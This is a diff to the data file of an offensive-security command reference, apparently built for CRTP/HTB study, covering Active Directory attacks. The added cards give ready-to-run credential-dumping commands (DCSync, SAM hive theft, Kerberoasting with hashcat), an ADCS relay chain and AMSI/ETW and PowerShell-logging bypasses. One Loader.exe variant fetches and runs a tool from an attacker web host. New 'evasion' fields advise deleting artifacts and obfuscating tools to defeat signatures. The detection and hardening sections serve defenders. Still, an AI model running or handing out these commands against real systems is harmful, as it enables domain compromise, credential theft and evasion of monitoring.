+        "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)",
+        "evasion": "Use valid creds; avoid rapid AUTH loops (rate-limited/alerted); read targeted mailboxes rather than bulk-pulling."
       }
     },
     {
@@ -27326,7 +28682,13 @@ const COMMAND_DATA = {
         "vulnerable_config": "# msDS-KeyCredentialLink writable by attacker (GenericWrite on target account):\n# pywhisker.py -t targetuser -a add\n# Adds a fake device credential -> obtain certificate for targetuser\n# -> PKINIT TGT as targetuser -> NTLM hash via UnPAC\n\n# LSASS memory contains TGTs for all logged-in users:\n# Mimikatz: sekurlsa::tickets /export\n# Rubeus: dump /all",
         "secure_config": "# Prevent msDS-KeyCredentialLink abuse:\n# Audit who has GenericWrite on privileged accounts\n# Only SYSTEM/DCs should write msDS-KeyCredentialLink\nGet-ObjectAcl -Identity admin -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}\n\n# Prevent ticket extraction:\n# Enable Credential Guard (blocks LSASS memory reads)\n# Protected Users group members: tickets not cached in LSASS\n\n# ADCS: prevent ESC1/ESC8 (see those cards)\n# Monitor: Event 4768 with certificate auth, Event 4769 unusual ticket lifetimes"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Only krbtgt",
+          "command": "impacket-secretsdump -k -no-pass -just-dc-user krbtgt -dc-ip <dc_ip> <domain>/<user>@<dc_fqdn>"
+        }
+      ]
     },
     {
       "id": "secretsdump-offline",
@@ -27397,7 +28759,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "impacket-secretsdump parses saved SAM/SYSTEM/SECURITY hives OFFLINE to output local NTLM hashes and LSA secrets.",
+        "why_it_works": "SAM/SECURITY/SYSTEM hives (or NTDS.dit + SYSTEM) contain hashed credentials protected only by the boot key, which is in the SYSTEM hive — so with all pieces, secretsdump decrypts every local/domain hash offline.",
         "prerequisites": "The SAM/SYSTEM/SECURITY hive files obtained from the target.",
         "impact": "Local account NTLM hashes and LSA secrets - offline, on the attacker box.",
         "detection": "Runs offline on the attacker host; the detectable step was saving/exfiltrating the hives (T1003.002).",
@@ -27409,9 +28771,34 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Credential material is accessible in multiple locations: SAM/NTDS.DIT via registry hives or VSS, LSASS minidump via Task Manager (non-admin on some configs), cached credentials in Windows Credential Manager (cmdkey), /etc/shadow readable by non-root. Offline attacks succeed because credentials are stored with weak hashing algorithms.",
         "vulnerable_config": "# Windows Credential Manager stores cleartext/encrypted creds:\ncmdkey /list\n# Manages: Domain:interactive=CORP\\svcaccount  (recoverable with DPAPI)\n\n# /etc/shadow accessible (bad permissions):\nls -la /etc/shadow  # -rw-r--r-- 1 root shadow (group-readable)\n# SHA-512 hashes: crackable with hashcat -m 1800",
-        "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)"
+        "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)",
+        "evasion": "Dump LSASS to a file with a LOLBAS (comsvcs.dll MiniDump) or an evasive tool (nanodump) and PARSE OFFLINE so Mimikatz never runs on the host; bypass/►check RunAsPPL first; delete the .dmp after; for DCSync prefer -just-dc-user krbtgt over a full dump to touch fewer objects and generate one 4662 instead of many."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "NTDS.dit offline",
+          "command": "impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL"
+        },
+        {
+          "label": "Remote DCSync",
+          "command": "impacket-secretsdump -just-dc <domain>/<user>:<password>@<dc_ip>"
+        },
+        {
+          "label": "Remote, only krbtgt",
+          "command": "impacket-secretsdump -just-dc-user krbtgt <domain>/<user>:<password>@<dc_ip>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Grab SAM/SECURITY/SYSTEM hives",
+          "command": "reg save HKLM\\sam sam.save & reg save HKLM\\security security.save & reg save HKLM\\system system.save"
+        },
+        {
+          "label": "Extract secrets offline",
+          "command": "impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL"
+        }
+      ]
     },
     {
       "id": "secretsdump-ntds",
@@ -27477,10 +28864,6 @@ const COMMAND_DATA = {
         }
       ],
       "variations": [
-        {
-          "label": "Offline",
-          "command": "impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL"
-        },
         {
           "label": "Remote (NetExec)",
           "command": "netexec smb <dc_ip> -u <user> -p <password> -M ntdsutil"
@@ -27703,7 +29086,27 @@ const COMMAND_DATA = {
         "vulnerable_config": "# msDS-KeyCredentialLink writable by attacker (GenericWrite on target account):\n# pywhisker.py -t targetuser -a add\n# Adds a fake device credential -> obtain certificate for targetuser\n# -> PKINIT TGT as targetuser -> NTLM hash via UnPAC\n\n# LSASS memory contains TGTs for all logged-in users:\n# Mimikatz: sekurlsa::tickets /export\n# Rubeus: dump /all",
         "secure_config": "# Prevent msDS-KeyCredentialLink abuse:\n# Audit who has GenericWrite on privileged accounts\n# Only SYSTEM/DCs should write msDS-KeyCredentialLink\nGet-ObjectAcl -Identity admin -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}\n\n# Prevent ticket extraction:\n# Enable Credential Guard (blocks LSASS memory reads)\n# Protected Users group members: tickets not cached in LSASS\n\n# ADCS: prevent ESC1/ESC8 (see those cards)\n# Monitor: Event 4768 with certificate auth, Event 4769 unusual ticket lifetimes"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Template DomainController",
+          "command": "impacket-ntlmrelayx -t http://<ca_ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Relay coerced auth to ADCS (ESC8)",
+          "command": "impacket-ntlmrelayx -t http://<ca_ip>/certsrv/certfnsh.asp -smb2support --adcs"
+        },
+        {
+          "label": "Coerce a DC (PetitPotam/printerbug)",
+          "command": "python3 PetitPotam.py <attacker_ip> <dc_ip>"
+        },
+        {
+          "label": "Use the issued cert for a TGT",
+          "command": "python3 gettgtpkinit.py -pfx-base64 <b64> <domain>/<dc>\\$ dc.ccache"
+        }
+      ]
     },
     {
       "id": "pth-impacket",
@@ -27889,7 +29292,21 @@ const COMMAND_DATA = {
         "vulnerable_config": "# SMB signing disabled on workstations (Windows default):\nGet-SmbServerConfiguration | Select-Object RequireSecuritySignature\n# RequireSecuritySignature: False  <- relay attacks work\n\n# Any authenticated user can spray:\n# No lockout policy = try one password against 1000 users\n# netexec smb <dc_ip> -u users.txt -p 'Summer2024!' --continue-on-success",
         "secure_config": "# Enable SMB signing everywhere:\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n# GPO: 'Microsoft network server: Digitally sign communications (always)' = Enabled\n\n# Disable LLMNR + NBT-NS (see responder card)\n# Account lockout policy: 5 attempts, 30-min window\n# Firewall: block SMB between workstations (allow only to file servers/DCs)"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "wmiexec (quieter)",
+          "command": "impacket-wmiexec <user>:'<password>'@<ip>"
+        },
+        {
+          "label": "Pass-the-hash",
+          "command": "impacket-psexec -hashes :<nt_hash> <user>@<ip>"
+        },
+        {
+          "label": "NetExec exec",
+          "command": "nxc smb <ip> -u <user> -p '<password>' -x 'whoami'"
+        }
+      ]
     },
     {
       "id": "impacket-exec",
@@ -27922,10 +29339,6 @@ const COMMAND_DATA = {
         "smb"
       ],
       "variations": [
-        {
-          "label": "wmiexec (WMI, no service/binary - quieter)",
-          "command": "impacket-wmiexec <domain>/<user>:<password>@<ip>"
-        },
         {
           "label": "wmiexec with hash (PtH)",
           "command": "impacket-wmiexec -hashes :<nt_hash> <domain>/<user>@<ip>"
@@ -28102,6 +29515,34 @@ const COMMAND_DATA = {
       },
       "tools": [
         "impacket"
+      ],
+      "variations": [
+        {
+          "label": "Authenticate with a password",
+          "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password>"
+        },
+        {
+          "label": "Pass-the-ticket (Kerberos)",
+          "command": "GetUserSPNs.py -k -no-pass -dc-ip <dc_ip> <domain>/<user>"
+        },
+        {
+          "label": "Cross-domain",
+          "command": "GetUserSPNs.py -target-domain <foreign_domain> -dc-ip <dc_ip> <domain>/<user>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "List SPN accounts (roast targets)",
+          "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password>"
+        },
+        {
+          "label": "Pick weak service accounts (old PasswordLastSet)",
+          "command": "# note samaccountname of svc/SQL/admin accounts"
+        },
+        {
+          "label": "Request their TGS hashes",
+          "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password> -request -outputfile hashes.txt"
+        }
       ]
     },
     {
@@ -28177,7 +29618,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "impacket GetUserSPNs -request requests TGS tickets for SPN accounts from Linux and outputs their crackable hashes.",
+        "why_it_works": "Any authenticated user can request a Kerberos service ticket (TGS) for any SPN. The TGS is encrypted with the service account's password hash, so requesting it yields an offline-crackable blob without touching the service (Kerberoasting).",
         "prerequisites": "Valid domain credentials and network access to the DC.",
         "impact": "Crackable TGS hashes for the domain's service accounts.",
         "detection": "[MITRE T1558.003] Event 4769 (TGS requested) with RC4 encryption type (0x17) when AES is standard, or a burst of TGS requests for many SPNs from one source in a short window; a request for a honeypot SPN account is malicious by definition.",
@@ -28194,7 +29635,153 @@ const COMMAND_DATA = {
       },
       "tools": [
         "impacket"
+      ],
+      "variations": [
+        {
+          "label": "Roast a single user",
+          "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password> -request-user <target> -outputfile hash.txt"
+        },
+        {
+          "label": "Pass-the-ticket",
+          "command": "GetUserSPNs.py -k -no-pass -dc-ip <dc_ip> <domain>/<user> -request -outputfile hashes.txt"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Request all TGS-REP hashes",
+          "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password> -request -outputfile hashes.txt"
+        },
+        {
+          "label": "Crack offline (hashcat 13100)",
+          "command": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"
+        },
+        {
+          "label": "Use the cracked service-account creds",
+          "command": "# check local admin / delegation for that account"
+        }
       ]
+    },
+    {
+      "id": "crtp-loader",
+      "name": "In-Memory Execution with Loader.exe (ETW/AMSI unhook)",
+      "command": "Loader.exe -path <tool_path_or_url> -args <tool_arguments>",
+      "description": "CRTP's core execution primitive. Loader.exe unhooks ETW and AMSI in the current process, then reflectively loads a .NET assembly (Rubeus, SafetyKatz, Certify, etc.) from disk or a URL and runs it entirely in memory - no child process, nothing dropped. Paired with the 'evasive' Rubeus/Mimikatz verbs it defeats most of the lab's AV/EDR.",
+      "platform": "windows",
+      "category": "Active Directory",
+      "subcategory": "Evasion",
+      "type": "command",
+      "certifications": [
+        "CRTP"
+      ],
+      "source": "CRTP",
+      "opsec": "moderate",
+      "mitre": [
+        "T1620",
+        "T1562.001",
+        "T1562.006"
+      ],
+      "tools": [
+        "Loader.exe",
+        "Rubeus",
+        "SafetyKatz",
+        "Certify"
+      ],
+      "tags": [
+        "in-memory",
+        "reflective-loading",
+        "etw",
+        "amsi",
+        "evasion",
+        "loader",
+        "crtp"
+      ],
+      "variations": [
+        {
+          "label": "Run a local assembly with args",
+          "command": "Loader.exe -path <local_exe_path> -args <arguments>"
+        },
+        {
+          "label": "Fetch + run from a web host (fileless)",
+          "command": "Loader.exe -path http://<attacker_ip>:<port>/<tool>.exe -args <arguments>"
+        },
+        {
+          "label": "Copy Loader to a remote host, then run over winrs",
+          "command": "winrs -r:<host> C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/<tool>.exe -args \"<args>\" \"exit\""
+        }
+      ],
+      "steps": [
+        {
+          "label": "Stage Loader.exe (download to a writable dir)",
+          "command": "iwr http://172.16.100.x/Loader.exe -OutFile C:\\Users\\Public\\Loader.exe"
+        },
+        {
+          "label": "Run Rubeus in-memory (asktgt / overpass-the-hash)",
+          "command": "C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args asktgt /user:svcadmin /aes256:<aes256_key> /opsec /ptt"
+        },
+        {
+          "label": "Run SafetyKatz evasively (dump keys)",
+          "command": "C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe -args \"sekurlsa::evasive-keys\" \"exit\""
+        }
+      ],
+      "examples": [
+        {
+          "label": "winPEAS in memory",
+          "command": "C:\\AD\\Tools\\Loader.exe -Path C:\\AD\\Tools\\winPEASx64.exe -args notcolor log"
+        },
+        {
+          "label": "DCSync via SafetyKatz (evasive)",
+          "command": "C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe -args \"lsadump::evasive-dcsync /user:dcorp\\krbtgt\" \"exit\""
+        },
+        {
+          "label": "Remote, chained through a portproxy on 127.0.0.1:8080",
+          "command": "winrs -r:dcorp-mgmt C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe \"sekurlsa::Evasive-keys\" \"exit\""
+        }
+      ],
+      "notes": "Loader.exe is the CRTP course's custom AV-evasion loader (an obfuscated variant is rebuilt with Codecepticon). Use with the 'evasive-' Mimikatz/Rubeus verbs (evasive-keys, evasive-dcsync, evasive-golden, evasive-lsa, evasive-sam, evasive-pth). When the target can't reach your web host directly, set up a netsh portproxy on a jump host and point Loader at http://127.0.0.1:8080/. See crtp-portproxy-pivot. Rebuild/obfuscate the loader when signatures catch it - see crtp-tool-obfuscation.",
+      "references": [
+        {
+          "title": "CRTP - Attacking and Defending AD (lab)",
+          "url": "https://www.alteredsecurity.com/adlab"
+        },
+        {
+          "title": "MITRE ATT&CK T1620 - Reflective Code Loading",
+          "url": "https://attack.mitre.org/techniques/T1620/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-amsi-sbl-bypass",
+          "note": "Bypass AMSI/logging first when running PowerShell tooling",
+          "rel": "prereq"
+        },
+        {
+          "id": "crtp-credential-dumping",
+          "note": "Loader typically runs SafetyKatz/Rubeus to dump creds",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-portproxy-pivot",
+          "note": "Reach an isolated web host to fetch the assembly",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "prerequisites": "Execution on the host (any user). A .NET assembly to run (Rubeus/SafetyKatz/Certify) and, for the fileless variant, a reachable web host.",
+        "why_it_works": "Userland EDR/AV hooks live in the process's own memory (ntdll/amsi.dll) and ETW providers are toggled per-process; an attacker running in that process can patch amsi.dll's AmsiScanBuffer, zero the ETW provider, and use .NET reflection (Assembly.Load) to execute an assembly without spawning a child process or touching disk - so file and command-line based detections never fire.",
+        "misconfiguration": "Reliance on userland API hooks and AMSI as the primary defense; no kernel-level (ETW-TI / kernel callbacks) telemetry; unsigned .NET assemblies allowed to load; no application allowlisting (WDAC/AppLocker in enforce).",
+        "impact": "Fileless, in-memory execution of offensive .NET tooling with ETW/AMSI blinded - foothold for credential theft, ticket forging, and lateral movement with minimal artifacts.",
+        "detection": "ETW-TI (threat-intelligence) provider still sees Assembly.Load / VirtualProtect on amsi.dll from a non-standard module. Image-load of clr.dll into an unusual process; AMSI init failures; Event 4104 gaps where PowerShell logging suddenly goes silent. Memory scanning (e.g. by EDR) for known assembly signatures. Sysmon 7 (ImageLoad) of clr/mscoree into odd binaries.",
+        "artifacts": "Loader.exe on disk (if not fileless); network fetch of a .exe over HTTP to 127.0.0.1/attacker; RWX memory regions in the host process; sudden loss of Script Block Logging (4104) or AMSI events.",
+        "vulnerable_config": "# AMSI + userland hooks only; no ETW-TI, no WDAC enforce\n# Unsigned .NET assemblies permitted; PowerShell CLM off",
+        "secure_config": "# Enable ETW-TI based EDR sensors (kernel telemetry survives userland patching)\n# WDAC/AppLocker in ENFORCE with signed-only policy\n# PowerShell Constrained Language Mode + Script Block Logging shipped to SIEM\n# Attack Surface Reduction rules: block untrusted/unsigned processes",
+        "prevention": "Deploy EDR that uses kernel/ETW-TI telemetry rather than only userland hooks. Enforce WDAC/AppLocker (signed-only). Enable ASR rules and PowerShell CLM. Ship AMSI/Script Block logs to a SIEM and alert on sudden silence. [MITRE M1040, M1038, M1042]",
+        "evasion": "The technique IS the evasion (ETW/AMSI unhook, reflective load). Further: rebuild/obfuscate Loader with Codecepticon to defeat static signatures; fetch fileless over a portproxy; use evasive-* verbs that avoid classic API patterns.",
+        "sources": [
+          "CRTP",
+          "MITRE T1620",
+          "MITRE T1562.001"
+        ]
+      }
     },
     {
       "id": "cdsa-ir-lifecycle",
@@ -28442,7 +30029,8 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M26",
           "MITRE T1115"
-        ]
+        ],
+        "evasion": "Blend the lure (SCF/LNK/clipboard) into a share users already browse; keep the capture window short; remove the planted file after a hash lands."
       }
     },
     {
@@ -28518,7 +30106,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1057",
           "MITRE T1552"
-        ]
+        ],
+        "evasion": "Blend the lure (SCF/LNK/clipboard) into a share users already browse; keep the capture window short; remove the planted file after a hash lands."
       }
     },
     {
@@ -28620,7 +30209,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1187",
           "MITRE T1557.001"
-        ]
+        ],
+        "evasion": "Blend the lure (SCF/LNK/clipboard) into a share users already browse; keep the capture window short; remove the planted file after a hash lands."
       }
     },
     {
@@ -28694,7 +30284,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "Inveigh's C# build is a compiled LLMNR/NBT-NS/mDNS spoofer for hash capture where PowerShell is constrained/monitored.",
+        "why_it_works": "When a name doesn't resolve via DNS, Windows falls back to LLMNR/NBT-NS/mDNS broadcasts; Inveigh answers them, so the victim authenticates to the attacker and leaks a NetNTLM hash.",
         "prerequisites": "Execution of the Inveigh binary on a host in the victim segment.",
         "impact": "NetNTLM hashes captured via a compiled tool that avoids PowerShell logging.",
         "detection": "[MITRE T1557.001] LLMNR/NBT-NS/mDNS responses from an unexpected host; a spoofed name-resolution answer; NetNTLM auth to an unknown host. Honeypot name-lookups (queries for non-existent hosts) that get answered reveal poisoning; Defender for Identity flags it. A non-PowerShell process emitting spoofed name-resolution answers.",
@@ -28711,6 +30301,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "Inveigh"
+      ],
+      "variations": [
+        {
+          "label": "Common options",
+          "command": ".\\Inveigh.exe -LLMNR Y -NBNS Y -FileOutput Y"
+        }
       ]
     },
     {
@@ -28793,7 +30389,124 @@ const COMMAND_DATA = {
       },
       "tools": [
         "Inveigh"
+      ],
+      "variations": [
+        {
+          "label": "File output + only unique",
+          "command": "Invoke-Inveigh -NBNS Y -mDNS Y -FileOutput Y"
+        }
       ]
+    },
+    {
+      "id": "crtp-invishell",
+      "name": "InviShell - AMSI & PowerShell Logging Bypass (COR_PROFILER)",
+      "command": "C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat",
+      "description": "InviShell spawns a PowerShell session with AMSI, Script Block Logging, and Module Logging disabled by abusing the unmanaged CLR profiler (COR_PROFILER) COM hijack - no admin rights needed. It registers an InprocServer32 CLSID under HKCU and sets COR_ENABLE_PROFILING so a custom DLL loads into powershell.exe and neuters logging/AMSI. The go-to way to run PowerView/PowerUp/Mimikatz scripts quietly in CRTP.",
+      "platform": "windows",
+      "category": "Active Directory",
+      "subcategory": "Evasion",
+      "type": "command",
+      "certifications": [
+        "CRTP"
+      ],
+      "source": "CRTP",
+      "opsec": "quiet",
+      "mitre": [
+        "T1562.001",
+        "T1574.012",
+        "T1112"
+      ],
+      "tools": [
+        "InviShell",
+        "reg"
+      ],
+      "tags": [
+        "amsi-bypass",
+        "logging-bypass",
+        "cor-profiler",
+        "evasion",
+        "invishell",
+        "crtp"
+      ],
+      "variations": [
+        {
+          "label": "Admin variant (uses PATH env)",
+          "command": "C:\\AD\\Tools\\InviShell\\RunWithPathAsAdmin.bat"
+        },
+        {
+          "label": "Manual COR_PROFILER setup (what the .bat does)",
+          "command": "set COR_ENABLE_PROFILING=1 & set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Register the profiler CLSID under HKCU",
+          "command": "REG ADD \"HKCU\\Software\\Classes\\CLSID\\{cf0d821e-299b-5307-a3d8-b283c03916db}\\InprocServer32\" /ve /t REG_SZ /d \"C:\\AD\\Tools\\InviShell\\InShellProf.dll\" /f"
+        },
+        {
+          "label": "Launch the cloaked shell",
+          "command": "C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat"
+        },
+        {
+          "label": "Now load offensive modules quietly",
+          "command": ". C:\\AD\\Tools\\PowerView.ps1"
+        }
+      ],
+      "examples": [
+        {
+          "label": "Cloaked shell then PowerView enumeration",
+          "command": "C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\nPS> . C:\\AD\\Tools\\PowerView.ps1; Get-DomainUser"
+        },
+        {
+          "label": "Cloaked shell then import the AD module",
+          "command": "C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\nPS> Import-Module C:\\AD\\Tools\\ADModule-master\\ActiveDirectory\\ActiveDirectory.psd1"
+        }
+      ],
+      "notes": "InviShell = unmanaged CLR profiler (COR_PROFILER) COM hijack; runs as a normal user because HKCU CLSID registration needs no admin. It cleans up its registry key on exit. Use it as the outer shell for any PowerShell-based tooling (PowerView, PowerUp, Invoke-Mimikatz). For .NET binaries use crtp-loader instead; for a quick one-liner AMSI/logging patch without a new shell see crtp-amsi-sbl-bypass.",
+      "references": [
+        {
+          "title": "CRTP - Attacking and Defending AD (lab)",
+          "url": "https://www.alteredsecurity.com/adlab"
+        },
+        {
+          "title": "MITRE ATT&CK T1574.012 - COR_PROFILER",
+          "url": "https://attack.mitre.org/techniques/T1574/012/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-ad-module-enum",
+          "note": "Run AD-module enumeration inside the cloaked shell",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-amsi-sbl-bypass",
+          "note": "One-liner alternative when you don't want a new shell",
+          "rel": "alternative"
+        },
+        {
+          "id": "crtp-powerview-users-groups",
+          "note": "PowerView enumeration, run quietly here",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "prerequisites": "Local execution as any user. InviShell files (InShellProf.dll + the .bat launchers) on the host. Write access to HKCU (default for the logged-on user).",
+        "why_it_works": "The .NET CLR loads any profiler DLL named by the COR_ENABLE_PROFILING / COR_PROFILER environment variables and resolves the CLSID from the registry - including HKCU, which a normal user can write. The profiler DLL loads into powershell.exe before AMSI/ETW logging initializes, letting it disable them. It is a per-user, no-admin logging/AMSI bypass.",
+        "misconfiguration": "AMSI/PowerShell logging treated as sufficient without tamper detection; HKCU CLSID writes and COR_PROFILER env vars not monitored; no EDR watching profiler DLL loads into powershell.exe.",
+        "impact": "PowerShell runs with AMSI, Script Block Logging, and Module Logging disabled - offensive scripts execute with no script content captured, blinding the primary Windows PowerShell telemetry.",
+        "detection": "Registry writes to HKCU\\Software\\Classes\\CLSID\\...\\InprocServer32 (Sysmon 13). Process env containing COR_ENABLE_PROFILING/COR_PROFILER for powershell.exe. Unexpected DLL (InShellProf.dll) image-loaded into powershell.exe (Sysmon 7). Sudden absence of 4103/4104 events for an interactive session.",
+        "artifacts": "HKCU CLSID key referencing InShellProf.dll; COR_PROFILER env var on the powershell process; the profiler DLL on disk; gaps in PowerShell operational logs.",
+        "vulnerable_config": "# PowerShell logging on, but no tamper/COR_PROFILER monitoring\n# HKCU CLSID writes unaudited; unsigned DLLs can load into powershell.exe",
+        "secure_config": "# Block/monitor COR_PROFILER: set env allowlist via WDAC or EDR\n# Sysmon: alert on HKCU CLSID InprocServer32 writes + DLL loads into powershell.exe\n# WDAC signed-only DLL policy (blocks InShellProf.dll)\n# Ship 4103/4104 to SIEM and alert on session-logging silence",
+        "prevention": "Enforce WDAC/AppLocker signed-only DLL loading (blocks the profiler DLL). Monitor and alert on COR_PROFILER env vars and HKCU CLSID InprocServer32 writes. Use EDR that flags profiler injection into powershell.exe. [MITRE M1038, M1040, M1042]",
+        "evasion": "Runs as a normal user (no admin event trail). Registry key is created and removed per session. Rename the DLL/CLSID to avoid static IOC lists.",
+        "sources": [
+          "CRTP",
+          "MITRE T1574.012",
+          "MITRE T1562.001"
+        ]
+      }
     },
     {
       "type": "command",
@@ -28894,7 +30607,9 @@ const COMMAND_DATA = {
         "why_it_works": "Invoke-DOSfuscation generates obfuscated Windows CMD commands using environment variable substring extraction. Environment variables like %TEMP%, %COMMONPROGRAMFILES%, %TMP% contain substrings that can be extracted with :~start,length notation to construct any character. typ%TEMP:~-3,-2% becomes 'type' because %TEMP% ends in 'tmp' — extracting -3,-2 gives 'p'. This constructs commands without any readable command keywords.",
         "impact": "Bypasses Windows-based WAF and IDS signature rules for command injection. CMD obfuscation is especially effective on legacy Windows web applications running IIS with ASP/ASP.NET that pass input to cmd.exe.",
         "detection": "[MITRE T1059] WAF: %VAR:~N,M% environment variable substring patterns in parameters. Windows process audit: cmd.exe spawned by IIS worker process (w3wp.exe). Allowlist validation on expected input format.",
-        "artifacts": "Access log: %TEMP:~-3,-2% and similar env-var substring patterns in parameters. Windows event log: cmd.exe process created by w3wp.exe."
+        "artifacts": "Access log: %TEMP:~-3,-2% and similar env-var substring patterns in parameters. Windows event log: cmd.exe process created by w3wp.exe.",
+        "code_review": "RED FLAGS (source): user input reaches a shell/exec call.\n  system( / exec( / shell_exec( / passthru( / popen( / proc_open(  |  os.system / subprocess(..., shell=True)  |  child_process.exec(  |  backticks `...`\nGREP:  grep -rniE \"system\\(|exec\\(|shell_exec|passthru|popen|proc_open|os\\.system|subprocess.*shell=True|child_process\\.exec\\(|`.*\\$\" .\nSAFE:  avoid the shell; use argument arrays / execve-style APIs (subprocess.run([...], shell=False)); strict allowlist; escapeshellarg only as last resort.",
+        "evasion": "Confirm blind injections out-of-band (DNS/HTTP callback) instead of relying on reflected output; URL/base64-encode the payload and use $(...) to avoid obvious separators; keep it a single short command and pull a full shell over an existing channel."
       }
     },
     {
@@ -28970,7 +30685,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Invoke-TheHash (PowerShell) performs PtH over SMB/WMI to execute commands using an NTLM hash, from a Windows foothold.",
+        "why_it_works": "NTLM/Kerberos authenticate the account's SECRET (its NT hash or Kerberos key), not the plaintext password — the KDC/target never sees the password itself. So possessing the hash/ticket is equivalent to knowing the password: you inject it and authenticate as that user without ever cracking it. Invoke-TheHash performs WMI/SMB auth using the raw NT hash.",
         "prerequisites": "A valid NTLM hash and SMB/WMI access from a PowerShell-capable host.",
         "impact": "Command execution on the target via PtH from PowerShell.",
         "detection": "[MITRE T1550.002] Event 4624 Logon Type 3 with Authentication Package NTLM and LogonProcessName NtLmSsp, with NO preceding interactive logon for that account; the same NTLM hash authenticating from an unusual source; 4672 for privileged PtH.",
@@ -29167,7 +30882,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Services expose excessive information: version banners, supported auth methods, valid usernames via error responses. IPMI has no authentication (version 2.0 cipher 0 vulnerability). RSH/rexec trust .rhosts files. rsync shares readable anonymously. Oracle TNS allows remote poisoning in older versions.",
         "vulnerable_config": "# IPMI cipher 0 — no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data — auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS — version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
